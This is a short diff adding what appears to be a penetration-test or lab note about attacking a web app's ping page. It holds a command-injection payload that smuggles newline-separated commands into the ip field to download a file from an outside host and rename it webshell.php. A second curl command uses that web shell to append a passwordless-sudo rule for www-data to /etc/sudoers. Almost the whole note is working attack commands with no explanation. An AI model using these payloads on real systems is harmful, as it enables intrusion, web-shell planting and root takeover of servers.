@@ -1,0 +1,7 @@
+https://10.2.2.150/index.php?page=ping.php
+
+modify post data - ip=127.0.0.1%0awget IP%0amv index.html webshell.php%0a&send=Ping+It%21
+
+privesc:
+
+curl http://127.0.0.1:8080/start_page.php?page=cmd.php --data "cmd=echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
